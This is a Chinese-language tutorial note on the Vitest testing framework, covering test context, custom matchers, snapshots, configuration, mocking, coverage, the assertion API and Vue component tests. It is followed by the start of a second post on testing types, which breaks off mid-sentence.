每个测试回调的第一个参数是测试上下文。 import { it } from 'vitest' it('should work', (ctx) =&gt; { // prints name of the test console.log(ctx.meta.name) }) 内置的测试上下文。 context.meta 包含关于测试的元数据的只读对象。 context.expect 绑定到当前测试的 expect API。 每个测试的上下文都不同。可以在 beforeEach 和 afterEach hooks 中访问和扩展它们。 import { beforeEach, it } from 'vitest' beforeEach(async (context) =&gt; { // extend context context.foo = 'bar' }) it('should work', ({ foo }) =&gt; { console.log(foo) // 'bar' }) 可以通过添加聚合(aggregate)类型 TestContext, 为你的自定义上下文属性提供类型支持。 declare module 'vitest' { export interface TestContext { foo?: string } } 如果只想为特定的 beforeEach、afterEach、it 或 test hooks 提供属性类型，则可以将类型作为泛型传递。 interface LocalTestContext { foo: string } beforeEach&lt;LocalTestContext&gt;(async (context) =&gt; { // typeof context is 'TestContext &amp; LocalTestContext' context.foo = 'bar' }) it&lt;LocalTestContext&gt;('should work', ({ foo }) =&gt; { // typeof foo is 'string' console.log(foo) // 'bar' }) 扩展断言(Matchers) 由于 Vitest 兼容 Chai 和 Jest，所以可以根据个人喜好使用 chai.use API 或者 expect.extend。 可以使用对象包裹断言的形式调用 expect.extend 方法扩展默认的断言。 expect.extend({ // 第一个参数是接收值，其余参数将直接传给断言 toBeFoo(received, expected) { const { isNot } = this return { // 请勿根据 isNot 参数更改你的 &quot;pass&quot; 值，Vitest 为你做了这件事情 pass: received === 'foo', message: () =&gt; `${received} is${isNot ? ' not' : ''} foo`, } }, }) 断言方法可以访问上下文 this 对象中的这些属性: isNot 如果断言是在 not 方法上调用的( expect(received).not.toBeFoo() )，则返回 true。 promise 如果断言是在 resolved/rejected 中调用的，它的值将包含此断言的名称。否则，它将是一个空字符串。 equals 这是一个工具函数，他可以帮助你比较两个值。如果是相同的则返回 true，反之返回 false。这个方法几乎在每个断言内部都有使用。默认情况下，它支持非对称的断言。 utils 它包含了一系列工具函数，可以使用它们来显示信息。 this 上下文也包含了当前测试的信息，可以通过调用 expect.getState() 来获取它，有用的属性是： currentTestName 当前测试的全称(包括 describe 块)。 testPath 当前测试的路径。 断言的返回值应该兼容如下接口： interface MatcherResult { pass: boolean message: () =&gt; string // 如果你传了这些参数，它们将自动出现在 diff 信息中， // 所以即便断言不通过，你也不必自己输出 diff actual?: unknown expected?: unknown } 使用 TypeScript 时，可以使用以下代码扩展默认的 Matchers 接口： interface CustomMatchers&lt;R = unknown&gt; { toBeFoo(): R } declare global { namespace Vi { interface Assertion extends CustomMatchers {} interface AsymmetricMatchersContaining extends CustomMatchers {} } // jest.Matchers interface will also work. } 源码内联测试 Vitest 还提供了一种方式，可以运行与你的代码实现放在一起的测试，允许测试与实现共享相同的闭包，并且能够在不导出的情况下针对私有状态进行测试。可用于: 小范围的功能或工具的单元测试 原型设计 内联断言 对于更复杂的测试，比如组件测试或 E2E 测试，建议使用单独的测试文件取而代之。 首先，在 if (import.meta.vitest) 代码块内写一些测试代码并放在文件的末尾，例如： // src/index.ts // 函数实现 export function add(...args: number[]) { return args.reduce((a, b) =&gt; a + b, 0) } // 源码内的测试套件 if (import.meta.vitest) { const { it, expect } = import.meta.vitest it('add', () =&gt; { expect(add()).toBe(0) expect(add(1)).toBe(1) expect(add(1, 2, 3)).toBe(6) }) } 更新 Vitest 配置文件内的 includeSource 以获取到 src/ 下的文件： // vite.config.ts import { defineConfig } from 'vitest/config' export default defineConfig({ test: { includeSource: ['src/**/*.{js,ts}'], }, }) 执行测试。 npx vitest 对于生产环境的构建，你需要设置配置文件内的 define 选项，让打包器清除无用的代码。 // vite.config.ts import { defineConfig } from 'vitest/config' export default defineConfig({ + define: { + 'import.meta.vitest': 'undefined', + }, test: { includeSource: ['src/**/*.{js,ts}'] }, }) 要获得对 import.meta.vitest 的 TypeScript 支持，添加 vitest/importMeta 到 tsconfig.json： // tsconfig.json { &quot;compilerOptions&quot;: { &quot;types&quot;: [ + &quot;vitest/importMeta&quot; ] } } 快照 当希望确保函数的输出不会意外更改时，可以使用快照测试，兼容 Jest 快照测试。使用快照时，Vitest 将获取给定值的快照，将其比较时将参考存储在测试旁边的快照文件。如果两个快照不匹配，则测试将失败：要么更改是意外的，要么参考快照需要更新到测试结果的新版本。 要将一个值快照，你可以使用 expect() 的 toMatchSnapshot() API： import { expect, it } from 'vitest' it('renders correctly', () =&gt; { const result = toUpperCase('foobar') expect(result).toMatchSnapshot() }) 此测试在第一次运行时，Vitest 会创建一个快照文件，如下所示： // Vitest Snapshot v1 exports['toUpperCase 1'] = '&quot;FOOBAR&quot;' 快照文件应该与代码更改一起提交，并作为代码审查过程的一部分进行审查。在随后的测试运行中，Vitest 会将执行的输出与之前的快照进行比较。如果他们匹配，测试就会通过。如果它们不匹配，要么测试运行时在你的代码中发现了应该修复的错误，要么实现已经更改，需要更新快照： 在监听(watch)模式下, 你可以在终端中键入 u 键直接更新失败的快照。 或者，你可以在 CLI 中使用 --update 或 -u 标记，vitest -u 使 Vitest 进入快照更新模式。 指定超时阈值 你可以选择将超时阈值（以毫秒为单位）作为第三个参数传递给测试。默认值为 5 秒。 import { test } from 'vitest' test('name', async () =&gt; { /* ... */ }, 1000) Hooks 也可以接收超时阈值，默认值为 5 秒。 import { beforeAll } from 'vitest' beforeAll(async () =&gt; { /* ... */ }, 1000) 选择、跳过、待办测试套件和测试 使用 .only 仅运行某些测试套件或测试。 import { assert, describe, it } from 'vitest' // 仅运行此测试套件（以及标记为 Only 的其他测试套件） describe.only('suite', () =&gt; { it('test', () =&gt; { assert.equal(Math.sqrt(4), 3) }) }) describe('another suite', () =&gt; { it('skipped test', () =&gt; { // 已跳过测试，因为测试在 Only 模式下运行 assert.equal(Math.sqrt(4), 3) }) it.only('test', () =&gt; { // 仅运行此测试（以及标记为 Only 的其他测试） assert.equal(Math.sqrt(4), 2) }) }) 使用 .skip 以避免运行某些测试套件或测试。 import { assert, describe, it } from 'vitest' describe.skip('skipped suite', () =&gt; { it('test', () =&gt; { // 已跳过此测试套件，无错误 assert.equal(Math.sqrt(4), 3) }) }) describe('suite', () =&gt; { it.skip('skipped test', () =&gt; { // 已跳过此测试，无错误 assert.equal(Math.sqrt(4), 3) }) }) 使用 .todo 留存将要实施的测试套件和测试的待办事项。 import { describe, it } from 'vitest' // 此测试套件的报告中将显示一个条目 describe.todo('unimplemented suite') // 此测试的报告中将显示一个条目 describe('suite', () =&gt; { it.todo('unimplemented test') }) 类型测试 从 Vitest 0.25.0 开始，Vitest 附带 expect-type 包，可以使用 expectTypeOf 或 assertType 语法为你的类型编写测试。 在测试文件中触发的任何类型错误都将被视为测试错误，因此可以使用任何类型技巧来测试项目中的类型。 默认情况下，*.test-d.ts 文件中的所有测试都被视为类型测试，但可以使用 typecheck.include 配置选项更改它。 Vitest 不运行或编译这些文件，它们仅由编译器静态分析，因此你不能使用任何动态语句，所以不能使用动态测试名称和 test.each、test.runIf、test.skipIf、test.each、test.concurrent API，但可以使用其他 API，例如 test、describe、.only、.skip 和 .todo。 使用 CLI 标志，如 --allowOnly 和 -t 也支持类型检查。 import { assertType, expectTypeOf } from 'vitest' import { mount } from './mount.js' test('my types work properly', () =&gt; { expectTypeOf(mount).toBeFunction() expectTypeOf(mount).parameter(0).toMatchTypeOf&lt;{ name: string }&gt;() // @ts-expect-error name is a string assertType(mount({ name: 42 })) }) 在 package.json 文件 scripts 部分添加如下命令： { &quot;scripts&quot;: { &quot;typecheck&quot;: &quot;vitest typecheck&quot; } } Vitest 使用 tsc --noEmit 或 vue-tsc --noEmit，具体取决于配置。 同时运行多个测试 在连续测试中使用 .concurrent 将会并发运行它们。 import { describe, it } from 'vitest' // 标记为concurrent的两个测试将并行运行 describe('suite', () =&gt; { it('serial test', async () =&gt; { /* ... */ }) it.concurrent('concurrent test 1', async ({ expect }) =&gt; { /* ... */ }) it.concurrent('concurrent test 2', async ({ expect }) =&gt; { /* ... */ }) }) 在测试套件中使用 .concurrent，则其中的每个测试用例都将并发运行。 import { describe, it } from 'vitest' // 此套件中的所有测试都将并行运行 describe.concurrent('suite', () =&gt; { it('concurrent test 1', async ({ expect }) =&gt; { /* ... */ }) it('concurrent test 2', async ({ expect }) =&gt; { /* ... */ }) it.concurrent('concurrent test 3', async ({ expect }) =&gt; { /* ... */ }) }) 还可以将 .skip、.only 和 .todo 用于并发测试套件和测试用例。 Vitest 配置 Vitest 的主要优势之一是它与 Vite 的统一配置，vitest 将读取你的根目录 vite.config.ts 以匹配插件，例如 resolve.alias 和 plugins 的配置将会在 Vitest 中开箱即用。 创建 vitest.config.ts，优先级将会最高。 将 --config 选项传递给 CLI，例如 vitest --config ./path/to/vitest.config.ts。 在 defineConfig 上使用 process.env.VITEST 或 mode 属性（如果没有被覆盖，将设置为 test）有条件地在 vite.config.ts 中应用不同的配置。 使用 vite 的 defineConfig 还需要将 三斜线指令 写在配置文件的顶部，可以参考下面的格式： /// &lt;reference types=&quot;vitest&quot; /&gt; import { defineConfig } from 'vite' export default defineConfig({ test: { /* 使用global避免全局导入（description、test、expect） */ // globals: true, }, }) 使用 vitest 的 defineConfig 可以参考下面的格式： import { defineConfig } from 'vitest/config' export default defineConfig({ test: { // ... }, }) 如果有需要，可以获取到 Vitest 的默认选项以扩展它们： import { configDefaults, defineConfig } from 'vitest/config' export default defineConfig({ test: { exclude: [...configDefaults.exclude, 'packages/template/*'], }, }) 对象模拟(Mocking) 在编写测试时，可能会因为时间问题，需要创建内部或外部服务的 “假” 版本，这通常被称为 对象模拟 操作。Vitest 通过 vi 提供了一些实用的函数用于解决这个问题。你可以使用 import { vi } from 'vitest' 或者 全局配置 进行访问它(当启用 全局配置 时)。 import { expect, vi } from 'vitest' const fn = vi.fn() fn('hello', 1) expect(vi.isMockFunction(fn)).toBe(true) expect(fn.mock.calls[0]).toEqual(['hello', 1]) fn.mockImplementation(arg =&gt; arg) fn('world', 2) expect(fn.mock.results[1].value).toBe('world') Vitest 支持 happy-dom 或 jsdom 来模拟 DOM 和浏览器 API。Vitest 并不内置它们，所以需要安装： npm i -D happy-dom # or npm i -D jsdom 然后，更改 environment 配置文件中的选项： // vite.config.ts import { defineConfig } from 'vitest/config' export default defineConfig({ test: { environment: 'happy-dom', // or 'jsdom', 'node' }, }) 测试覆盖率 Vitest 通过 c8 支持本机代码覆盖率。同时也支持 istanbul。默认情况下，启用 c8。可以通过将 test.coverage.provider 设置为 c8 或 istanbul 来选择覆盖工具： // vite.config.ts import { defineConfig } from 'vitest/config' export default defineConfig({ test: { coverage: { provider: 'istanbul', // or 'c8' }, }, }) 当你启动 Vitest 进程时，它会提示你自动安装相应的支持包： npm i -D @vitest/coverage-c8 # or npm i -D @vitest/coverage-istanbul 要在启用的情况下进行测试，在 CLI 中传递 --coverage 标志： { &quot;scripts&quot;: { &quot;test&quot;: &quot;vitest&quot;, &quot;coverage&quot;: &quot;vitest run --coverage&quot; } } 要对其进行配置，需要在配置文件中设置 test.coverage 选项： // vite.config.ts import { defineConfig } from 'vitest/config' export default defineConfig({ test: { coverage: { reporter: ['text', 'json', 'html'], }, }, }) 也可以通过将 'custom' 传递给 test.coverage.provider 来配置你的自定义覆盖率提供者： // vite.config.ts import { defineConfig } from 'vitest/config' export default defineConfig({ test: { coverage: { provider: 'custom', customProviderModule: 'my-custom-coverage-provider', }, }, }) 自定义覆盖率提供者需要一个 customProviderModule 选项，它是一个模块名称或从中加载 CoverageProviderModule 的路径。它必须将实现 CoverageProviderModule 的对象导出为默认导出： // my-custom-coverage-provider.ts import type { CoverageProvider, CoverageProviderModule, ResolvedCoverageOptions, Vitest, } from 'vitest' const CustomCoverageProviderModule: CoverageProviderModule = { getProvider(): CoverageProvider { return new CustomCoverageProvider() }, // Implements rest of the CoverageProviderModule ... } class CustomCoverageProvider implements CoverageProvider { name = 'custom-coverage-provider' options!: ResolvedCoverageOptions initialize(ctx: Vitest) { this.options = ctx.config.coverage } // Implements rest of the CoverageProvider ... } export default CustomCoverageProviderModule 运行覆盖率报告时，会在项目的根目录中创建一个 coverage 文件夹。如果想将它移动到不同的目录，使用 vite.config.js 文件中的 test.coverage.reportsDirectory 属性： import { defineConfig } from 'vite' export default defineConfig({ test: { coverage: { reportsDirectory: './tests/unit/coverage', }, }, }) 命令行 在安装了 Vitest 的项目中，可以在 npm 脚本中使用 vitest 脚本，或者直接使用 npx vitest 运行它。以下是脚手架 Vitest 项目中的默认 npm 脚本： { &quot;scripts&quot;: { &quot;test&quot;: &quot;vitest&quot;, &quot;coverage&quot;: &quot;vitest run --coverage&quot; } } vitest 在开发环境下默认启动时使用 监听模式(watch mode)，当你修改源代码或测试文件时，Vitest 智能搜索模块依赖树并只重新运行相关测试，就像 HMR 在 Vite 的工作方式一样！ 在 CI 环境（当 process.env.CI 出现时）中以 运行模式(run mode) 启动，在不监视文更改的情况下执行单次运行。 可以使用 vitest watch 或 vitest run 明确指定所需的模式。 可以使用 CLI 按名称筛选测试文件，例如 vitest basic 将只执行包含 basic 路径名的测试文件。 basic.test.ts basic-foo.test.ts Vitest 默认启动多线程，可以通过 CLI 中的 --no-threads 禁用。 Vitest 还隔离了每个测试文件的运行环境，因此一个文件中的运行环境改变不会影响其他文件，可以通过将 --no-isolate 传递给 CLI 来禁用隔离（以正确性换取运行性能）。 还可以指定其他 CLI 选项，例如 --port 或 --https，在项目中运行 npx vitest --help 获取有关 CLI 选项的完整列表。 Vitest UI Vitest 由 Vite 提供能力，在运行测试时有一个开发服务器。这允许 Vitest 提供一个漂亮的 UI 界面来查看并与测试交互。 安装： npm i -D @vitest/ui 通过传入 --ui 参数来启动测试的 UI 界面： vitest --ui 通过 http://localhost:51204/__vitest__/ 可以访问 Vitest UI 界面。 Vitest 0.26.0 开始, UI 也可以用作测试报告器。在 Vitest 配置中使用 'html' 报告器生成 HTML 输出并预览测试结果，如果仍想在终端中实时查看测试的运行情况，不要忘记将 default 报告器添加到 reporters 选项。 // vitest.config.ts export default { test: { reporters: ['default', 'html'], }, } 要预览你的 HTML 报告，可以使用 vite preview 命令： npx vite preview --base __vitest__ --outDir ./html 可以使用 --outputFile=&lt;path&gt; 配置选项配置输出，./html/index.html 是默认值。 API describe 描述, 会形成一个作用域，用来组织测试和基准，使报告更加清晰 test 别名 it，定义了一组关于测试期望的方法，接收测试名称和一个含有测试期望的函数，可以提供一个超时时限（以毫秒为单位）用于指定等待多长时间后终止测试，默认为 5 秒，也可以通过 testTimeout 选项进行全局配置 expect 用来创建断言 not 将会否定断言 toBe 可用于断言基础对象是否相等 toBeDefined 断言检查值是否不等于 undefined toBeUndefined 断言检查值是否等于 undefined toBeNull 简单地断言检查值是否为 null，是 .toBe(null) 的别名 toBeNaN 简单地断言是否为 NaN，是 .toBe(NaN) 的别名 toBeTruthy 会将检查值转换为布尔值，断言该值是否为 true toBeFalsy 会将检测值转换为布尔值，断言该值是否为 false toBeTypeOf 断言检查值是否属于接收的类型 toBeInstanceOf 断言检查值是否为接收的类的实例 toBeGreaterThan 断言检查值是否大于接收值 toBeGreaterThanOrEqual 断言检查值是否大于等于接收值 toBeLessThan 断言检查值是否小于接收值 toBeLessThanOrEqual 断言检查值是否小于等于接收值 toEqual 断言检查值是否等于接收值，或者是同样的结构，如果是对象类型（将会使用递归的方法进行比较） toStrictEqual 断言检查值是否等于接收值或者同样的结构，如果是对象类型（将会使用递归的方法进行比较），并且会比较它们是否是相同的类型 toContain 断言检查值是否在数组中，还可以检查一个字符串是否为另一个字符串的子串 toContainEqual 断言在数组中是否包含具有特定结构和值的元素，就像对每个元素进行 toEqual 操作 toHaveLength 断言一个对象是否具有 .length 属性，并且为数值 toHaveProperty 用于断言对象上是否存在指定 key 的属性，同时该方法还提供了一个可选参数，用于进行深度对比，就像使用 toEqual 比较接收到的属性值 toMatch 断言字符串是否匹配指定的正则表达式或字符串 toMatchObject 用于断言对象是否匹配指定的对象属性的子集，还可以传递对象数组。如果我们只想检查两个数组的元素数量是否匹配，该方法就会很有用，它不同于 arrayContaining ，它允许接收数组中的额外元素 toThrowError 断言函数在调用时是否抛出错误，可以提供一个可选参数来测试是否引发了指定的错误： 正则表达式：错误信息通过正则表达式匹配 字符串：错误消息包含指定子串 resolves 可以从待处理的 Promise 中去展开它的值，并使用通常的断言语句来断言它的值 rejects 可以来展开 Promise 被拒绝的原因，并使用通常的断言语句来断言它的值 expect.assertions 在测试通过或失败后，它将会验证在测试期间调用了多少次断言，常用于检查异步代码是否被调用了 expect.anything 这种非对称匹配器与相等检查一起使用时，将始终返回 true，如果你只是想确保该属性存在时很有用 expect.any 这种非对称匹配器与相等检查一起使用时，仅当 value 是指定构造函数的实例时才会返回 true，如果你有一个每次都生成的值，并且只想知道它以正确的类型存在是很有用 expect.arrayContaining 当与相等检查一起使用时，如果 value 是一个数组并包含指定的选项，则此非对称匹配器将返回 true，可以将 expect.not 与此匹配器一起使用来否定预期值 expect.objectContaining 当与相等检查一起使用时，如果 value 具有相似的结构，则此非对称匹配器将返回 true，可以将 expect.not 与此匹配器一起使用来否定预期值 expect.stringContaining 当与相等检查一起使用时，如果 value 是字符串并且包含指定的子字符串，则此非对称匹配器将返回 true，可以将 expect.not 与此匹配器一起使用来否定预期值 expect.stringMatching 当与相等检查一起使用时，如果 value 是字符串并且包含指定的子字符串或字符串匹配正则表达式，则此非对称匹配器将返回 true，可以将 expect.not 与此匹配器一起使用来否定预期值 not import { expect, test } from 'vitest' const input = Math.sqrt(16) expect(input).not.to.equal(2) // chai API expect(input).not.toBe(2) // jest API toEqual 和 toBe 之间的区别 import { expect, test } from 'vitest' const stockBill = { type: 'apples', count: 13, } const stockMary = { type: 'apples', count: 13, } test('stocks have the same properties', () =&gt; { expect(stockBill).toEqual(stockMary) }) test('stocks are not the same', () =&gt; { expect(stockBill).not.toBe(stockMary) }) toEqual 和 toStrictEqual 之间的区别 import { expect, test } from 'vitest' class Stock { constructor(type) { this.type = type } } test('structurally the same, but semantically different', () =&gt; { expect(new Stock('apples')).toEqual({ type: 'apples' }) expect(new Stock('apples')).not.toStrictEqual({ type: 'apples' }) }) toHaveProperty import { expect, test } from 'vitest' const invoice = { 'isActive': true, 'P.O': '12345', 'customer': { first_name: 'John', last_name: 'Doe', location: 'China', }, 'total_amount': 5000, 'items': [ { type: 'apples', quantity: 10, }, { type: 'oranges', quantity: 5, }, ], } test('John Doe Invoice', () =&gt; { expect(invoice).toHaveProperty('isActive') // 断言 key 存在 expect(invoice).toHaveProperty('total_amount', 5000) // 断言 key 存在且值相等 expect(invoice).not.toHaveProperty('account') // 断言 key 不存在 // 使用 dot 进行深度引用 expect(invoice).toHaveProperty('customer.first_name') expect(invoice).toHaveProperty('customer.last_name', 'Doe') expect(invoice).not.toHaveProperty('customer.location', 'India') // 使用包含 key 的数组进行深度引用 expect(invoice).toHaveProperty('items[0].type', 'apples') expect(invoice).toHaveProperty('items.0.type', 'apples') // 使用 dot 也可以工作 // 在数组中包装你的 key 来避免它作为深度引用 expect(invoice).toHaveProperty(['P.O'], '12345') }) toMatch import { expect, test } from 'vitest' test('top fruits', () =&gt; { expect('top fruits include apple, orange and grape').toMatch(/apple/) expect('applefruits').toMatch('fruit') // toMatch 也可以是一个字符串 }) toMatchObject import { expect, test } from 'vitest' const johnInvoice = { isActive: true, customer: { first_name: 'John', last_name: 'Doe', location: 'China', }, total_amount: 5000, items: [ { type: 'apples', quantity: 10, }, { type: 'oranges', quantity: 5, }, ], } const johnDetails = { customer: { first_name: 'John', last_name: 'Doe', location: 'China', }, } test('invoice has john personal details', () =&gt; { expect(johnInvoice).toMatchObject(johnDetails) }) test('the number of elements must match exactly', () =&gt; { // 断言对象数组是否匹配 expect([{ foo: 'bar' }, { baz: 1 }]).toMatchObject([ { foo: 'bar' }, { baz: 1 }, ]) }) toThrowError import { expect, test } from 'vitest' function getFruitStock(type) { if (type === 'pineapples') { throw new DiabetesError( 'Pineapples is not good for people with diabetes' ) } // 可以做一些其他的事情 } test('throws on pineapples', () =&gt; { // 测试错误消息是否在某处显示 &quot;diabetes&quot; ：这些是等效的 expect(() =&gt; getFruitStock('pineapples')).toThrowError(/diabetes/) expect(() =&gt; getFruitStock('pineapples')).toThrowError('diabetes') // 测试确切的错误信息 expect(() =&gt; getFruitStock('pineapples')).toThrowError( /^Pineapples is not good for people with diabetes$/ ) }) resolves import { expect, test } from 'vitest' async function buyApples() { return fetch('/buy/apples').then(r =&gt; r.json()) } test('buyApples returns new stock id', async () =&gt; { // toEqual 现在返回一个 Promise ，所以我们必须等待它 await expect(buyApples()).resolves.toEqual({ id: 1 }) // jest API await expect(buyApples()).resolves.to.equal({ id: 1 }) // chai API }) rejects import { expect, test } from 'vitest' async function buyApples(id) { if (!id) throw new Error('no id') } test('buyApples throws an error when no id provided', async () =&gt; { // toThrow 现在返回一个 Promise ，所以你必须等待它 await expect(buyApples()).rejects.toThrow('no id') }) expect.assertions import { expect, test } from 'vitest' async function doAsync(...cbs) { await Promise.all(cbs.map((cb, index) =&gt; cb({ index }))) } test('all assertions are called', async () =&gt; { expect.assertions(2) function callback1(data) { expect(data).toBeTruthy() } function callback2(data) { expect(data).toBeTruthy() } await doAsync(callback1, callback2) }) expect.anything import { expect, test } from 'vitest' test('object has &quot;apples&quot; key', () =&gt; { expect({ apples: 22 }).toEqual({ apples: expect.anything() }) }) expect.any import { expect, test } from 'vitest' import { generateId } from './generators' test('&quot;id&quot; is a number', () =&gt; { expect({ id: generateId() }).toEqual({ id: expect.any(Number) }) }) expect.arrayContaining import { expect, test } from 'vitest' test('basket includes fuji', () =&gt; { const basket = { varieties: ['Empire', 'Fuji', 'Gala'], count: 3, } expect(basket).toEqual({ count: 3, varieties: expect.arrayContaining(['Fuji']), }) }) expect.objectContaining import { expect, test } from 'vitest' test('basket has empire apples', () =&gt; { const basket = { varieties: [ { name: 'Empire', count: 1, }, ], } expect(basket).toEqual({ varieties: [expect.objectContaining({ name: 'Empire' })], }) }) expect.stringContaining import { expect, test } from 'vitest' test('variety has &quot;Emp&quot; in its name', () =&gt; { const variety = { name: 'Empire', count: 1, } expect(basket).toEqual({ name: expect.stringContaining('Emp'), count: 1, }) }) expect.stringMatching import { expect, test } from 'vitest' test('variety ends with &quot;re&quot;', () =&gt; { const variety = { name: 'Empire', count: 1, } expect(basket).toEqual({ name: expect.stringMatching(/re$/), count: 1, }) }) 使用 在 package.json 文件 scripts 部分添加如下命令： { &quot;scripts&quot;: { &quot;test&quot;: &quot;vitest&quot;, &quot;test:run&quot;: &quot;vitest run&quot; } } 配置 vite.config.ts： /// &lt;reference types=&quot;vitest&quot; /&gt; // Configure Vitest (https://vitest.dev/config/) import { defineConfig } from 'vite' export default defineConfig({ test: { /* for example, use global to avoid globals imports (describe, test, expect): */ // globals: true, }, }) 定义文件。 suite.test.ts import { assert, describe, expect, it } from 'vitest' describe('suite name', () =&gt; { it('foo', () =&gt; { assert.equal(Math.sqrt(4), 2) }) it('bar', () =&gt; { expect(1 + 1).eq(2) }) it('snapshot', () =&gt; { expect({ foo: 'bar' }).toMatchSnapshot() }) }) sum.ts export default function sum(...numbers:number[]){ return numbers.reduce((total,number)=&gt;total+number,0) } sum.test.ts import sum from './sum' import {describe,expect,it} from &quot;vitest&quot; describe(&quot;#sum&quot;, () =&gt; { it(&quot;returns 0 with no numbers&quot;, () =&gt; { expect(sum()).toBe(0) }) }) 运行测试 pnpm run test:run，在 suite.test.ts 文件目录下面生成了一个快照文件 __snapshots__/suite.test.ts.snap： // Vitest Snapshot v1 exports[`suite name &gt; snapshot 1`] = ` { &quot;foo&quot;: &quot;bar&quot;, } `; 组件测试示例 定义组件： Case.tsx import { defineComponent, ref, watchEffect } from 'vue' export default defineComponent({ name: 'TestComponent', props: { value: String, }, emits: ['update:value'], setup(props, { emit }) { const local = ref('') watchEffect(() =&gt; { emit('update:value', local) }) watchEffect(() =&gt; { local.value = props.value! }) return { local, } }, render() { return ( &lt;a-select v-model={[this.local, 'value']}&gt; &lt;a-select-option value=&quot;aaa&quot;&gt;aaa&lt;/a-select-option&gt; &lt;/a-select&gt; ) }, }) Link.tsx import { defineComponent, PropType, ref } from &quot;vue&quot;; export type IType = 'default' | 'primary' | 'success' | 'warning' | 'danger'| 'info' export type IColor = 'black' | 'blue' | 'green' | 'yellow'| 'red' | 'gray' export const props = { type: { type: String as PropType&lt;IType&gt;, default: &quot;default&quot;, }, color: { type: String as PropType&lt;IColor&gt;, default: &quot;black&quot;, }, plain: { type: Boolean, default: true, }, href: { type: String, required: true, }, } as const; export default defineComponent({ name: &quot;CLink&quot;, props, setup(props, { slots }) { return () =&gt; ( &lt;a class={` text-${props.plain ? props.color + &quot;-500&quot; : &quot;white&quot;} hover:text-${props.color}-400 cursor-pointer text-lg hover:text-white transition duration-300 ease-in-out transform hover:scale-105 mx-1 decoration-none `} href={props.href} &gt; {slots.default ? slots.default() : 'Link'} &lt;/a&gt; ); }, }); vitest 本身是不支持单元组件测试的，需要安装 Vue Test Utils：pnpm add @vue/test-utils jsdom -D。 配置： package.json { &quot;scripts&quot;: { &quot;test&quot;: &quot;vitest&quot;, &quot;test:run&quot;: &quot;vitest run&quot; }, } vite.config.ts import { defineConfig } from 'vite' import Vue from '@vitejs/plugin-vue' import Jsx from '@vitejs/plugin-vue-jsx' export default defineConfig({ plugins: [Vue(), Jsx()], test: { globals: true, environment: 'jsdom', transformMode: { web: [/.[tj]sx$/], }, }, }) 定义测试。 case.test.ts //创建一个包含被挂载和渲染的组件的Wrapper，和mount不同的是shallowMount仅限测试组件，不牵扯子组件内容 import { shallowMount } from '@vue/test-utils' import { expect, test } from 'vitest' import Case from '../src/Case' test('mount component', () =&gt; { const wrapper = shallowMount(Case, { props: { value: 'test', }, global: { stubs: ['a-select', 'a-select-option'], }, }) //返回 Wrapper DOM 节点的 HTML 字符串到快照 expect(wrapper.html()).toMatchSnapshot() }) link.test.ts import Link from '../src/link/Link' import { shallowMount } from '@vue/test-utils' import { describe, expect, test } from 'vitest' //使用shallowMount()方法挂载组件，并使用expect断言方法来检验组件的渲染是否正确 describe('Link', () =&gt; { test(&quot;mount @vue/test-utils&quot;, () =&gt; { const wrapper = shallowMount(Link, { slots: { default: 'Link' } }); //断言 expect(wrapper.text()).toBe(&quot;Link&quot;) }) }) //对组件颜色进行测试，测试默认link颜色 describe(&quot;Link&quot;, () =&gt; { test(&quot;default color is black&quot;, () =&gt; { // 使用 shallowMount 方法挂载组件 const wrapper = shallowMount(Link); // 断言组件默认颜色是否是 black expect(wrapper.props().color).toBe(&quot;black&quot;); }); }); 运行测试 pnpm run test:run，在 case.test.ts 文件目录下面生成了一个快照文件 __snapshots__/case.test.ts.snap： // Vitest Snapshot v1 exports[`mount component 1`] = `&quot;&lt;a-select-stub value=\\\\&quot;test\\\\&quot;&gt;&lt;/a-select-stub&gt;&quot;`; ","link":"https://zkrisj.github.io/post/vitest-zhi-shi-zong-jie-or-qing-xun-ying-bi-ji/"},{"title":"测试知识总结 ｜ 青训营笔记","content":"为什么需要测试 自动化测试能够预防无意引入的 bug，并鼓励开发者将应用分解为可测试、可维护的函数、模块、类和组件。这能够帮助你和你的团队更快速、自信地构建复杂的 Vue 应用。 与任何应用一样，新的 Vue 应用可能会以多种方式崩溃，因此，在发布前发现并解决这些问题就变得十分重要。 测试越早越好，因为拖得越久，应用就会有越多的依赖和复杂性，想要开始添加测试也就越困难。 测试的类型 当设计你的 Vue 应用的测试策略时，你应该利用以下几种测试类型： 单元测试：检查给定函数、类或组合式函数的输入是否产生预期的输出或副作用。 组件测试：检查你的组件是否正常挂载和渲染、是否可以与之互动，以及表现是否符合预期。这些测试比单元测试导入了更多的代码，更复杂，需要更多时间来执行。 端到端测试：检查跨越多个页面的功能，并对生产构建的 Vue 应用进行实际的网络请求。这些测试通常涉及到建立一个数据库或其他后端。 每种测试类型在你的应用的测试策略中都发挥着作用，保护你免受不同类型的问题的影响。 端到端（E2E）测试 虽然单元测试为所写的代码提供了一定程度的验证，但单元测试和组件测试在部署到生产时，对应用整体覆盖的能力有限。因此，端到端测试针对的可以说是应用最重要的方面：当用户实际使用你的应用时发生了什么。 端到端测试的重点是多页面的应用表现，针对你的应用在生产环境下进行网络请求。他们通常需要建立一个数据库或其他形式的后端，甚至可能针对一个预备上线的环境运行。 端到端测试通常会捕捉到路由、状态管理库、顶级组件（常见为 App 或 Layout）、公共资源或任何请求处理方面的问题。如上所述，它们可以捕捉到单元测试或组件测试无法捕捉的关键问题。 端到端测试不导入任何 Vue 应用的代码，而是完全依靠在真实浏览器中浏览整个页面来测试你的应用。 端到端测试验证了你的应用中的许多层。可以在你的本地构建的应用中，甚至是一个预上线的环境中运行。针对预上线环境的测试不仅包括你的前端代码和静态服务器，还包括所有相关的后端服务和基础设施。 通过测试用户操作如何影响你的应用，端到端测试通常是提高应用能否正常运行的置信度的关键。 推荐方案 Cypress 提供了最完整的端到端解决方案，其具有信息丰富的图形界面、出色的调试性、内置断言和存根、抗剥落性、并行化和快照等诸多特性。而且如上所述，它还提供对 组件测试 的支持。不过，它只支持测试基于 Chromium 的浏览器和 Firefox。 Playwright 也是一个非常好的端到端测试解决方案，支持测试范围更广的浏览器品类（主要是 WebKit 型的）。 Nightwatch v2 是一个基于 Selenium WebDriver 的端到端测试解决方案。它的浏览器品类支持范围是最广的。 单元测试 编写单元测试是为了验证小的、独立的代码单元是否按预期工作。 一个单元测试通常覆盖一个单个函数、类、组合式函数或模块。 单元测试侧重于逻辑上的正确性，只关注应用整体功能的一小部分。 他们可能会模拟你的应用环境的很大一部分（如初始状态、复杂的类、第三方模块和网络请求）。 一般来说，单元测试将捕获函数的业务逻辑和逻辑正确性的问题。 以这个 increment 函数为例： // helpers.js export function increment (current, max = 10) { if (current &lt; max) { return current + 1 } return current } 因为它很独立，可以很容易地调用 